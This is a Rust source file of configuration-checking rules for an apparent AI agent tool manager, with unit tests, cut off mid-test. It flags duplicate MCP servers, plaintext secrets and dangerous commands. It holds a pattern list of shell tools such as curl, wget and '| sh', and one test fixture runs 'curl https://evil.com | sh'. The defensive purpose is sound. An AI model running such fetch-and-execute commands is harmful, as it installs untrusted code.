// MCP Doctor Rules for Phase 5.
//
// All rules are read-only. They inspect indexed resources and emit RawIssue
// items. No secret plaintext is included in issue messages or persisted.

use std::collections::{HashMap, HashSet};

use crate::domain::{AgentKind, DoctorTargetRef, IssueSeverity, ResourceType, ScopeType};
use crate::services::doctor::{DoctorRule, RawIssue, RuleContext};
use crate::services::resources::ResourceRecord;

/// Detect duplicate MCP servers across agents within the same project scope.
pub struct DuplicateMcpRule;

impl DoctorRule for DuplicateMcpRule {
    fn name(&self) -> &'static str {
        "duplicate_mcp"
    }
    fn category(&self) -> &'static str {
        "mcp"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        // Group MCPs by normalized name + project_id
        let mut by_name: HashMap<String, Vec<(AgentKind, String)>> = HashMap::new();
        for resource in ctx.resources_by_type(ResourceType::Mcp) {
            let name_norm = resource.name.trim().to_ascii_lowercase();
            for binding in &resource.bindings {
                let project_id = binding.project_id.clone().unwrap_or_default();
                by_name
                    .entry(format!("{}:{}", name_norm, project_id))
                    .or_default()
                    .push((binding.agent_kind, resource.id.clone()));
            }
        }
        for agents in by_name.values() {
            let unique_agents: HashSet<AgentKind> = agents.iter().map(|(a, _)| *a).collect();
            if unique_agents.len() > 1 {
                let agent_names: Vec<String> = unique_agents
                    .iter()
                    .map(|a| a.as_str().to_string())
                    .collect();
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!(
                        "MCP '{}' is defined in multiple agents ({}). Consider consolidating to avoid conflicts.",
                        agents.first().map(|(_, id)| id.as_str()).unwrap_or("unknown"),
                        agent_names.join(", ")
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Mcp),
                        resource_id: agents.first().map(|(_, id)| id.clone()),
                        agent_kind: None,
                        project_id: ctx.project_id.clone(),
                        config_path: None,
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

/// Detect MCPs with missing environment variable references.
pub struct MissingEnvRule;

impl DoctorRule for MissingEnvRule {
    fn name(&self) -> &'static str {
        "missing_env"
    }
    fn category(&self) -> &'static str {
        "mcp"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Mcp) {
            let env_refs = resource
                .payload
                .get("envRefs")
                .and_then(|v| v.as_array())
                .cloned()
                .unwrap_or_default();
            if env_refs.is_empty() {
                continue;
            }
            let mut missing = Vec::new();
            for env_ref in &env_refs {
                if let Some(name) = env_ref.as_str() {
                    // Check if the environment variable is present in the current process.
                    if std::env::var(name).is_err() {
                        missing.push(name.to_string());
                    }
                }
            }
            if !missing.is_empty() {
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!(
                        "MCP '{}' references missing environment variables: {}",
                        resource.name,
                        missing.join(", ")
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Mcp),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

/// Detect plaintext secrets in MCP configuration payloads.
/// Does NOT include the secret value in the issue message or DB.
pub struct PlaintextSecretRule;

const SENSITIVE_KEYS: &[&str] = &[
    "api_key",
    "apikey",
    "api-key",
    "token",
    "auth_token",
    "access_token",
    "secret",
    "client_secret",
    "app_secret",
    "password",
    "passwd",
    "auth",
    "authorization",
];

fn is_sensitive_key(key: &str) -> bool {
    let lower = key.to_ascii_lowercase();
    SENSITIVE_KEYS.iter().any(|sk| lower.contains(sk))
}

impl DoctorRule for PlaintextSecretRule {
    fn name(&self) -> &'static str {
        "plaintext_secret"
    }
    fn category(&self) -> &'static str {
        "mcp"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Mcp) {
            let payload = &resource.payload;
            // Recursively scan JSON payload for sensitive keys with string values.
            let mut found_fields = Vec::new();
            scan_json_for_secrets(payload, &mut found_fields, "");
            if !found_fields.is_empty() {
                issues.push(RawIssue {
                    severity: IssueSeverity::Critical,
                    message: format!(
                        "MCP '{}' may contain plaintext secrets in fields: {}. Consider using environment variable references.",
                        resource.name,
                        found_fields.join(", ")
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Mcp),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: true,
                });
            }
        }
        issues
    }
}

fn scan_json_for_secrets(value: &serde_json::Value, found: &mut Vec<String>, path: &str) {
    match value {
        serde_json::Value::Object(map) => {
            for (k, v) in map {
                let new_path = if path.is_empty() {
                    k.clone()
                } else {
                    format!("{}.{}", path, k)
                };
                if is_sensitive_key(k) {
                    if let Some(s) = v.as_str() {
                        if !s.is_empty() && !s.starts_with("${") && !s.starts_with("$") {
                            found.push(new_path.clone());
                        }
                    }
                }
                scan_json_for_secrets(v, found, &new_path);
            }
        }
        serde_json::Value::Array(arr) => {
            for (i, v) in arr.iter().enumerate() {
                scan_json_for_secrets(v, found, &format!("{}[{}]", path, i));
            }
        }
        _ => {}
    }
}

/// Detect dangerous commands in MCP server configurations.
pub struct DangerousCommandRule;

const DANGEROUS_PATTERNS: &[&str] = &[
    "rm ",
    "curl ",
    "wget ",
    "eval(",
    "eval ",
    "bash -c",
    "sh -c",
    "python -c",
    "python3 -c",
    "> /dev/null",
    "| sh",
    "| bash",
];

fn is_dangerous_command(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    DANGEROUS_PATTERNS.iter().any(|pat| lower.contains(pat))
}

impl DoctorRule for DangerousCommandRule {
    fn name(&self) -> &'static str {
        "dangerous_command"
    }
    fn category(&self) -> &'static str {
        "mcp"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Mcp) {
            let command = resource
                .payload
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if command.is_empty() {
                continue;
            }
            if is_dangerous_command(command) {
                issues.push(RawIssue {
                    severity: IssueSeverity::Critical,
                    message: format!(
                        "MCP '{}' uses potentially dangerous command '{}'. Review before enabling.",
                        resource.name, command
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Mcp),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

/// Detect disabled MCPs that are still referenced by active sub-agents or skills.
pub struct DisabledButReferencedRule;

impl DoctorRule for DisabledButReferencedRule {
    fn name(&self) -> &'static str {
        "disabled_but_referenced"
    }
    fn category(&self) -> &'static str {
        "mcp"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        // Build set of disabled MCP resource IDs in this scope.
        let disabled_mcps: HashSet<String> = ctx
            .resources_by_type(ResourceType::Mcp)
            .iter()
            .filter(|r| {
                !r.payload
                    .get("enabled")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true)
            })
            .map(|r| r.id.clone())
            .collect();

        if disabled_mcps.is_empty() {
            return issues;
        }

        for resource in ctx.resources_by_type(ResourceType::SubAgent) {
            let bound_mcp_ids = resource
                .payload
                .get("boundMcpIds")
                .and_then(|v| v.as_array())
                .cloned()
                .unwrap_or_default();
            for id_value in &bound_mcp_ids {
                if let Some(id) = id_value.as_str() {
                    if disabled_mcps.contains(id) {
                        issues.push(RawIssue {
                            severity: IssueSeverity::Warning,
                            message: format!(
                                "Sub-agent '{}' references disabled MCP '{}'.",
                                resource.name, id
                            ),
                            target_ref: Some(DoctorTargetRef {
                                resource_type: Some(ResourceType::SubAgent),
                                resource_id: Some(resource.id.clone()),
                                agent_kind: resource.agent_kind,
                                project_id: ctx.project_id.clone(),
                                config_path: resource.source_path.clone(),
                            }),
                            fixable: true,
                        });
                    }
                }
            }
        }

        issues
    }
}

// ---------------------------------------------------------------------------
// Skill Doctor Rules
// ---------------------------------------------------------------------------

/// Detect skills that are missing a description.
pub struct SkillMissingDescriptionRule;

impl DoctorRule for SkillMissingDescriptionRule {
    fn name(&self) -> &'static str {
        "skill_missing_description"
    }
    fn category(&self) -> &'static str {
        "skill"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Skill) {
            let desc = resource
                .payload
                .get("description")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if desc.trim().is_empty() {
                issues.push(RawIssue {
                    severity: IssueSeverity::Info,
                    message: format!("Skill '{}' is missing a description.", resource.name),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Skill),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: true,
                });
            }
        }
        issues
    }
}

/// Detect skills that are missing an entry file (source_path is unset).
pub struct SkillMissingEntryRule;

impl DoctorRule for SkillMissingEntryRule {
    fn name(&self) -> &'static str {
        "skill_missing_entry"
    }
    fn category(&self) -> &'static str {
        "skill"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Skill) {
            if resource.source_path.is_none() {
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!(
                        "Skill '{}' has no entry file path configured.",
                        resource.name
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Skill),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: None,
                    }),
                    fixable: true,
                });
            }
        }
        issues
    }
}

/// Detect skills whose configured source_path does not exist on disk.
pub struct SkillBrokenPathRule;

impl DoctorRule for SkillBrokenPathRule {
    fn name(&self) -> &'static str {
        "skill_broken_path"
    }
    fn category(&self) -> &'static str {
        "skill"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Skill) {
            if let Some(ref path) = resource.source_path {
                if !std::path::Path::new(path).exists() {
                    issues.push(RawIssue {
                        severity: IssueSeverity::Warning,
                        message: format!(
                            "Skill '{}' entry file does not exist: {}",
                            resource.name, path
                        ),
                        target_ref: Some(DoctorTargetRef {
                            resource_type: Some(ResourceType::Skill),
                            resource_id: Some(resource.id.clone()),
                            agent_kind: resource.agent_kind,
                            project_id: ctx.project_id.clone(),
                            config_path: Some(path.clone()),
                        }),
                        fixable: true,
                    });
                }
            }
        }
        issues
    }
}

/// Detect skills that are not bound to any active project.
pub struct SkillUnusedRule;

impl DoctorRule for SkillUnusedRule {
    fn name(&self) -> &'static str {
        "skill_unused"
    }
    fn category(&self) -> &'static str {
        "skill"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::Skill) {
            let has_active = resource.bindings.iter().any(|b| b.status == "active");
            if !has_active {
                issues.push(RawIssue {
                    severity: IssueSeverity::Info,
                    message: format!("Skill '{}' is not enabled in any project.", resource.name),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::Skill),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

// ---------------------------------------------------------------------------
// Sub-agent Doctor Rules
// ---------------------------------------------------------------------------

/// Detect sub-agents whose slug conflicts across agents.
pub struct SubAgentNameConflictRule;

impl DoctorRule for SubAgentNameConflictRule {
    fn name(&self) -> &'static str {
        "sub_agent_name_conflict"
    }
    fn category(&self) -> &'static str {
        "sub-agent"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        let mut by_slug: HashMap<String, Vec<AgentKind>> = HashMap::new();
        for resource in ctx.resources_by_type(ResourceType::SubAgent) {
            let slug = resource
                .slug
                .clone()
                .unwrap_or_else(|| resource.name.clone())
                .trim()
                .to_ascii_lowercase();
            if let Some(kind) = resource.agent_kind {
                by_slug.entry(slug).or_default().push(kind);
            }
        }
        for (slug, agents) in by_slug {
            let unique: HashSet<AgentKind> = agents.iter().copied().collect();
            if unique.len() > 1 {
                let names: Vec<String> = unique.iter().map(|a| a.as_str().to_string()).collect();
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!(
                        "Sub-agent '{}' has conflicting definitions in agents: {}.",
                        slug,
                        names.join(", ")
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::SubAgent),
                        resource_id: None,
                        agent_kind: None,
                        project_id: ctx.project_id.clone(),
                        config_path: None,
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

/// Detect sub-agents that reference non-existent MCPs.
pub struct SubAgentMissingMcpRule;

impl DoctorRule for SubAgentMissingMcpRule {
    fn name(&self) -> &'static str {
        "sub_agent_missing_mcp"
    }
    fn category(&self) -> &'static str {
        "sub-agent"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        let known_mcps: HashSet<String> = ctx
            .resources_by_type(ResourceType::Mcp)
            .iter()
            .map(|r| r.id.clone())
            .collect();
        for resource in ctx.resources_by_type(ResourceType::SubAgent) {
            let bound = resource
                .payload
                .get("boundMcpIds")
                .and_then(|v| v.as_array())
                .cloned()
                .unwrap_or_default();
            for id_val in &bound {
                if let Some(id) = id_val.as_str() {
                    if !known_mcps.contains(id) {
                        issues.push(RawIssue {
                            severity: IssueSeverity::Warning,
                            message: format!(
                                "Sub-agent '{}' references unknown MCP '{}'.",
                                resource.name, id
                            ),
                            target_ref: Some(DoctorTargetRef {
                                resource_type: Some(ResourceType::SubAgent),
                                resource_id: Some(resource.id.clone()),
                                agent_kind: resource.agent_kind,
                                project_id: ctx.project_id.clone(),
                                config_path: resource.source_path.clone(),
                            }),
                            fixable: true,
                        });
                    }
                }
            }
        }
        issues
    }
}

/// Detect sub-agents that reference non-existent Skills.
pub struct SubAgentMissingSkillRule;

impl DoctorRule for SubAgentMissingSkillRule {
    fn name(&self) -> &'static str {
        "sub_agent_missing_skill"
    }
    fn category(&self) -> &'static str {
        "sub-agent"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        let known_skills: HashSet<String> = ctx
            .resources_by_type(ResourceType::Skill)
            .iter()
            .map(|r| r.id.clone())
            .collect();
        for resource in ctx.resources_by_type(ResourceType::SubAgent) {
            let bound = resource
                .payload
                .get("boundSkillIds")
                .and_then(|v| v.as_array())
                .cloned()
                .unwrap_or_default();
            for id_val in &bound {
                if let Some(id) = id_val.as_str() {
                    if !known_skills.contains(id) {
                        issues.push(RawIssue {
                            severity: IssueSeverity::Warning,
                            message: format!(
                                "Sub-agent '{}' references unknown Skill '{}'.",
                                resource.name, id
                            ),
                            target_ref: Some(DoctorTargetRef {
                                resource_type: Some(ResourceType::SubAgent),
                                resource_id: Some(resource.id.clone()),
                                agent_kind: resource.agent_kind,
                                project_id: ctx.project_id.clone(),
                                config_path: resource.source_path.clone(),
                            }),
                            fixable: true,
                        });
                    }
                }
            }
        }
        issues
    }
}

/// Static heuristic: flag sub-agents whose role/name imply elevated permissions.
pub struct SubAgentOverPermissionRule;

const PERMISSION_HEURISTICS: &[&str] = &[
    "admin",
    "root",
    "full",
    "all",
    "system",
    "unrestricted",
    "superuser",
    "sudo",
];

fn suggests_elevated_permissions(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    PERMISSION_HEURISTICS.iter().any(|h| lower.contains(h))
}

impl DoctorRule for SubAgentOverPermissionRule {
    fn name(&self) -> &'static str {
        "sub_agent_over_permission"
    }
    fn category(&self) -> &'static str {
        "sub-agent"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::SubAgent) {
            let role = resource
                .payload
                .get("role")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let name = &resource.name;
            if suggests_elevated_permissions(role) || suggests_elevated_permissions(name) {
                issues.push(RawIssue {
                    severity: IssueSeverity::Info,
                    message: format!(
                        "Sub-agent '{}' has a role/name suggesting elevated permissions. Review its scope.",
                        resource.name
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::SubAgent),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

// ---------------------------------------------------------------------------
// Pi Doctor Rules
// ---------------------------------------------------------------------------

/// Detect Pi resources whose configured path does not exist.
pub struct PiMissingPathRule;

impl DoctorRule for PiMissingPathRule {
    fn name(&self) -> &'static str {
        "pi_missing_path"
    }
    fn category(&self) -> &'static str {
        "pi"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::PiResource) {
            if let Some(ref path) = resource.source_path {
                if !std::path::Path::new(path).exists() {
                    issues.push(RawIssue {
                        severity: IssueSeverity::Warning,
                        message: format!(
                            "Pi resource '{}' path does not exist: {}",
                            resource.name, path
                        ),
                        target_ref: Some(DoctorTargetRef {
                            resource_type: Some(ResourceType::PiResource),
                            resource_id: Some(resource.id.clone()),
                            agent_kind: resource.agent_kind,
                            project_id: ctx.project_id.clone(),
                            config_path: Some(path.clone()),
                        }),
                        fixable: true,
                    });
                }
            }
        }
        issues
    }
}

/// Detect duplicate Pi packages.
pub struct PiDuplicatePackageRule;

impl DoctorRule for PiDuplicatePackageRule {
    fn name(&self) -> &'static str {
        "pi_duplicate_package"
    }
    fn category(&self) -> &'static str {
        "pi"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        let mut by_source: HashMap<String, Vec<String>> = HashMap::new();
        for resource in ctx.resources_by_type(ResourceType::PiResource) {
            let kind = resource
                .payload
                .get("resourceType")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if kind != "package" {
                continue;
            }
            let source = resource
                .payload
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or(&resource.name)
                .trim()
                .to_ascii_lowercase();
            by_source
                .entry(source.clone())
                .or_default()
                .push(resource.id.clone());
        }
        for (source, ids) in by_source {
            if ids.len() > 1 {
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!("Pi package '{}' is declared {} times.", source, ids.len()),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::PiResource),
                        resource_id: Some(ids[0].clone()),
                        agent_kind: None,
                        project_id: ctx.project_id.clone(),
                        config_path: None,
                    }),
                    fixable: true,
                });
            }
        }
        issues
    }
}

/// Detect Pi extensions that are not marked as trusted.
pub struct PiUntrustedExtensionRule;

impl DoctorRule for PiUntrustedExtensionRule {
    fn name(&self) -> &'static str {
        "pi_untrusted_extension"
    }
    fn category(&self) -> &'static str {
        "pi"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        for resource in ctx.resources_by_type(ResourceType::PiResource) {
            let kind = resource
                .payload
                .get("resourceType")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if kind != "extension" {
                continue;
            }
            let trusted = resource
                .payload
                .get("trusted")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if !trusted {
                issues.push(RawIssue {
                    severity: IssueSeverity::Warning,
                    message: format!("Pi extension '{}' is not marked as trusted.", resource.name),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::PiResource),
                        resource_id: Some(resource.id.clone()),
                        agent_kind: resource.agent_kind,
                        project_id: ctx.project_id.clone(),
                        config_path: resource.source_path.clone(),
                    }),
                    fixable: true,
                });
            }
        }
        issues
    }
}

/// Detect Pi settings that are overridden at the project level.
pub struct PiProjectOverrideRule;

impl DoctorRule for PiProjectOverrideRule {
    fn name(&self) -> &'static str {
        "pi_project_override"
    }
    fn category(&self) -> &'static str {
        "pi"
    }
    fn check(&self, ctx: &RuleContext) -> Vec<RawIssue> {
        let mut issues = Vec::new();
        // Gather PiResourceKind::Setting resources by name.
        let mut by_name: HashMap<String, Vec<&ResourceRecord>> = HashMap::new();
        for resource in ctx.resources_by_type(ResourceType::PiResource) {
            let kind = resource
                .payload
                .get("resourceType")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if kind != "setting" {
                continue;
            }
            by_name
                .entry(resource.name.clone())
                .or_default()
                .push(resource);
        }
        for (name, group) in by_name {
            let global_count = group
                .iter()
                .filter(|r| {
                    r.bindings
                        .iter()
                        .any(|b| b.scope_type == ScopeType::Global && b.status == "active")
                })
                .count();
            let project_count = group
                .iter()
                .filter(|r| {
                    r.bindings
                        .iter()
                        .any(|b| b.scope_type == ScopeType::Project && b.status == "active")
                })
                .count();
            if global_count > 0 && project_count > 0 {
                issues.push(RawIssue {
                    severity: IssueSeverity::Info,
                    message: format!(
                        "Pi setting '{}' is defined at both global and project scope. Project settings will override global.",
                        name
                    ),
                    target_ref: Some(DoctorTargetRef {
                        resource_type: Some(ResourceType::PiResource),
                        resource_id: Some(group[0].id.clone()),
                        agent_kind: None,
                        project_id: ctx.project_id.clone(),
                        config_path: None,
                    }),
                    fixable: false,
                });
            }
        }
        issues
    }
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;
    use std::sync::Arc;

    use crate::domain::ScopeType;
    use crate::services::resources::{ResourceBindingRecord, ResourceRecord};

    fn mcp_resource(name: &str, enabled: bool, payload: serde_json::Value) -> ResourceRecord {
        ResourceRecord {
            id: format!("mcp:{}", name),
            resource_type: ResourceType::Mcp,
            name: name.to_string(),
            slug: Some(name.to_string()),
            agent_kind: Some(AgentKind::Codex),
            source_path: Some("/tmp/codex/mcp.json".into()),
            status: if enabled {
                "active".into()
            } else {
                "missing".into()
            },
            payload,
            updated_at: "2026-01-01T00:00:00Z".into(),
            bindings: vec![ResourceBindingRecord {
                id: "b1".into(),
                resource_type: ResourceType::Mcp,
                resource_id: format!("mcp:{}", name),
                agent_kind: AgentKind::Codex,
                project_id: Some("p1".into()),
                project_name: Some("Project One".into()),
                scope_type: ScopeType::Project,
                enabled,
                status: if enabled {
                    "active".into()
                } else {
                    "missing".into()
                },
                config_path: Some("/tmp/codex/mcp.json".into()),
                updated_at: "2026-01-01T00:00:00Z".into(),
            }],
        }
    }

    fn sub_agent_resource(name: &str, bound_mcp_ids: Vec<&str>) -> ResourceRecord {
        ResourceRecord {
            id: format!("sa:{}", name),
            resource_type: ResourceType::SubAgent,
            name: name.to_string(),
            slug: Some(name.to_string()),
            agent_kind: Some(AgentKind::ClaudeCode),
            source_path: Some("/tmp/claude/agents.json".into()),
            status: "active".into(),
            payload: json!({
                "boundMcpIds": bound_mcp_ids,
            }),
            updated_at: "2026-01-01T00:00:00Z".into(),
            bindings: vec![ResourceBindingRecord {
                id: "b2".into(),
                resource_type: ResourceType::SubAgent,
                resource_id: format!("sa:{}", name),
                agent_kind: AgentKind::ClaudeCode,
                project_id: Some("p1".into()),
                project_name: Some("Project One".into()),
                scope_type: ScopeType::Project,
                enabled: true,
                status: "active".into(),
                config_path: Some("/tmp/claude/agents.json".into()),
                updated_at: "2026-01-01T00:00:00Z".into(),
            }],
        }
    }

    fn ctx_with(resources: Vec<ResourceRecord>) -> RuleContext {
        RuleContext {
            db: Arc::new(crate::db::Database::open_in_memory().unwrap()),
            resources,
            project_id: Some("p1".into()),
            agent_kinds: vec![AgentKind::Codex, AgentKind::ClaudeCode],
        }
    }

    #[test]
    fn duplicate_mcp_detected_across_agents() {
        let resources = vec![mcp_resource("github", true, json!({"enabled": true})), {
            let mut r = mcp_resource("github", true, json!({"enabled": true}));
            r.agent_kind = Some(AgentKind::ClaudeCode);
            r.bindings[0].agent_kind = AgentKind::ClaudeCode;
            r
        }];
        let ctx = ctx_with(resources);
        let rule = DuplicateMcpRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("github"));
    }

    #[test]
    fn missing_env_detected() {
        // Ensure the env var does NOT exist.
        let var_name = "AGENTHUB_TEST_MISSING_VAR_XYZ";
        std::env::remove_var(var_name);
        let resources = vec![mcp_resource(
            "api",
            true,
            json!({"enabled": true, "envRefs": [var_name]}),
        )];
        let ctx = ctx_with(resources);
        let rule = MissingEnvRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains(var_name));
    }

    #[test]
    fn plaintext_secret_detected() {
        let resources = vec![mcp_resource(
            "api",
            true,
            json!({"enabled": true, "apiKey": "sk-12345-real-secret"}),
        )];
        let ctx = ctx_with(resources);
        let rule = PlaintextSecretRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("apiKey"));
        // Ensure the secret value itself is NOT in the message.
        assert!(!issues[0].message.contains("sk-12345"));
    }

    #[test]
    fn plaintext_secret_ignores_env_ref() {
        let resources = vec![mcp_resource(
            "api",
            true,
            json!({"enabled": true, "apiKey": "${API_KEY}"}),
        )];
        let ctx = ctx_with(resources);
        let rule = PlaintextSecretRule;
        let issues = rule.check(&ctx);
        assert!(issues.is_empty());
    }

    #[test]
    fn dangerous_command_detected() {
        let resources = vec![mcp_resource(
            "bad",
            true,
            json!({"enabled": true, "command": "curl https://evil.com | sh"}),
        )];
        let ctx = ctx_with(resources);
        let rule = DangerousCommandRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("curl"));
    }

    #[test]
    fn disabled_but_referenced_detected() {
        let resources = vec![
            mcp_resource("disabled_mcp", false, json!({"enabled": false})),
            sub_agent_resource("reviewer", vec!["mcp:disabled_mcp"]),
        ];
        let ctx = ctx_with(resources);
        let rule = DisabledButReferencedRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("disabled_mcp"));
    }

    // -----------------------------------------------------------------
    // Skill helpers and tests
    // -----------------------------------------------------------------

    fn skill_resource(
        name: &str,
        description: Option<&str>,
        source_path: Option<&str>,
        bindings: Vec<ResourceBindingRecord>,
    ) -> ResourceRecord {
        ResourceRecord {
            id: format!("skill:{}", name),
            resource_type: ResourceType::Skill,
            name: name.to_string(),
            slug: Some(name.to_string()),
            agent_kind: Some(AgentKind::Codex),
            source_path: source_path.map(|s| s.to_string()),
            status: "active".into(),
            payload: json!({
                "description": description,
                "slug": name,
            }),
            updated_at: "2026-01-01T00:00:00Z".into(),
            bindings,
        }
    }

    #[test]
    fn skill_missing_description_detected() {
        let resources = vec![skill_resource("lint", None, Some("/tmp/skill"), vec![])];
        let ctx = ctx_with(resources);
        let rule = SkillMissingDescriptionRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("missing a description"));
    }

    #[test]
    fn skill_missing_entry_detected() {
        let resources = vec![skill_resource("lint", Some("ok"), None, vec![])];
        let ctx = ctx_with(resources);
        let rule = SkillMissingEntryRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("no entry file"));
    }

    #[test]
    fn skill_broken_path_detected() {
        let resources = vec![skill_resource(
            "lint",
            Some("ok"),
            Some("/this/path/should/not/exist/skill"),
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = SkillBrokenPathRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("does not exist"));
    }

    #[test]
    fn skill_unused_detected() {
        let resources = vec![skill_resource(
            "orphan",
            Some("ok"),
            Some("/tmp/skill"),
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = SkillUnusedRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("not enabled"));
    }

    // -----------------------------------------------------------------
    // Sub-agent helpers and tests
    // -----------------------------------------------------------------

    fn sub_agent_with_skills(
        name: &str,
        role: &str,
        bound_mcp_ids: Vec<&str>,
        bound_skill_ids: Vec<&str>,
    ) -> ResourceRecord {
        ResourceRecord {
            id: format!("sa:{}", name),
            resource_type: ResourceType::SubAgent,
            name: name.to_string(),
            slug: Some(name.to_string()),
            agent_kind: Some(AgentKind::ClaudeCode),
            source_path: Some("/tmp/claude/agents.json".into()),
            status: "active".into(),
            payload: json!({
                "role": role,
                "boundMcpIds": bound_mcp_ids,
                "boundSkillIds": bound_skill_ids,
            }),
            updated_at: "2026-01-01T00:00:00Z".into(),
            bindings: vec![ResourceBindingRecord {
                id: "b2".into(),
                resource_type: ResourceType::SubAgent,
                resource_id: format!("sa:{}", name),
                agent_kind: AgentKind::ClaudeCode,
                project_id: Some("p1".into()),
                project_name: Some("Project One".into()),
                scope_type: ScopeType::Project,
                enabled: true,
                status: "active".into(),
                config_path: Some("/tmp/claude/agents.json".into()),
                updated_at: "2026-01-01T00:00:00Z".into(),
            }],
        }
    }

    #[test]
    fn sub_agent_name_conflict_detected() {
        let resources = vec![
            sub_agent_with_skills("reviewer", "code reviewer", vec![], vec![]),
            {
                let mut r = sub_agent_with_skills("reviewer", "code reviewer", vec![], vec![]);
                r.agent_kind = Some(AgentKind::Codex);
